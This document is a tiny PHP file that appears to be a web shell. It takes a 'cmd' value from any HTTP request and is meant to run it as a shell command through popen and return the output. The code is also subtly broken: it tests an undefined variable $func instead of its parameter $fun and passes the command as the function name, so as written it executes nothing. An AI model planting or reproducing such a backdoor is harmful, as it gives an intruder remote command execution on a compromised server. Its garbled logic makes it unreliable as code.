<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	if ($func == "popen") { if(@is_resource($f = @popen($cmd,"r"))){ while(!@feof($f))	$res .= @fread($f,1024);} @pclose($f);}
	return $res;
}

if (isset($_REQUEST['cmd']))
	do_phpfun($_REQUEST['cmd'], $_REQUEST['cmd']);
?>